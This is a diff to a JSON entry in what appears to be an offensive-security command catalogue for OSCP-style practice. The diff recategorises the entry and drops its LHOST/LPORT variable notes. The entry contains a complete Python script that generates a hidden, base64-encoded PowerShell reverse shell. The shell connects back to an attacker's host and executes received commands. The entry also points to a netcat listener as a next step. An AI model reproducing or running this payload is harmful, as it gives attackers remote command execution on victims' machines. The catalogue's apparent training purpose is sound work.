@@ -5,24 +5,11 @@
       "name": "Python Script - PowerShell Reverse Shell Base64 Encoder",
       "description": "Python script to generate base64-encoded PowerShell reverse shell with custom LHOST/LPORT",
       "command": "python3 encode.py",
-      "category": "SHELLS",
+      "category": "exploitation",
       "subcategory": "PAYLOAD_GENERATION",
       "os": "LINUX",
       "script_content": "import sys\nimport base64\n\npayload = '$client = New-Object System.Net.Sockets.TCPClient(\"<LHOST>\",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'\n\ncmd = \"powershell -nop -w hidden -e \" + base64.b64encode(payload.encode('utf16')[2:]).decode()\n\nprint(cmd)",
-      "variables": [
-        {
-          "name": "<LHOST>",
-          "description": "Attacker IP address for reverse connection (replace in script before running)",
-          "example": "192.168.118.2",
-          "required": true
-        },
-        {
-          "name": "<LPORT>",
-          "description": "Attacker listening port for reverse connection (replace in script before running)",
-          "example": "443",
-          "required": true
-        }
-      ],
+      "variables": [],
       "examples": [
         {
           "command": "# Save script as encode.py, modify LHOST/LPORT, then run:\npython3 encode.py",
@@ -68,8 +55,13 @@
         "OSCP:HIGH"
       ],
       "prerequisites": [],
-      "alternatives": ["revshell-ps-generator"],
-      "next_steps": ["ps-reverse-shell-base64", "nc-listener-setup"],
+      "alternatives": [
+        "revshell-ps-generator"
+      ],
+      "next_steps": [
+        "ps-reverse-shell-base64",
+        "nc-listener-setup"
+      ],
       "related_commands": [
         "ps-reverse-shell-base64",
         "ps-winrm-invoke-command",
